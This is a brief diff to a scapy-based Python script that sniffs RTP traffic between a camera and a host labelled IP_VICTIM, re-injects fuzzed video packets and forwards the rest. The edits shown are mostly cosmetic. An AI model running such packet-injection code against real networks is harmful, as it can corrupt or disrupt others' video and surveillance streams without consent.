@@ -1,6 +1,7 @@
 import subprocess
 from scapy.all import sniff, send, IP, UDP, Raw
 
+
 RTP_PORT_CAMERA = 48600  
 RTP_PORT_CLIENT = 58530   
 IFACE = "en0"             
@@ -43,13 +44,11 @@ def corrupt_rtp_packet(packet):
                 
                 # Send the corrupted packet back into the stream
                 send(new_packet, verbose=False, iface=IFACE)
-                print(f"[*] INJECTED: Fuzzed critical NAL Type {nal_type} packet.")
+                print(f"INJECTED: Fuzzed critical NAL Type {nal_type} packet.")
                 return 
 
     # If we dont care about the packet, just forward 
     send(packet, verbose=False, iface=IFACE)
 
-# Start sniffing and apply the corruption function
-print(f"[*] Starting RTP Corruption Sniffer on {IFACE}...")
-# Sniff traffic on both the camera's source port and the client's destination port
-sniff(iface=IFACE, filter=f"udp and host {IP_CAMERA} and host {IP_CLIENT}", prn=corrupt_rtp_packet)
+print("Starting RTP Corruption Sniffer on " + IFACE)
+sniff(iface=IFACE, filter=f"udp and host {IP_CAMERA} and host {IP_VICTIM}", prn=corrupt_rtp_packet)
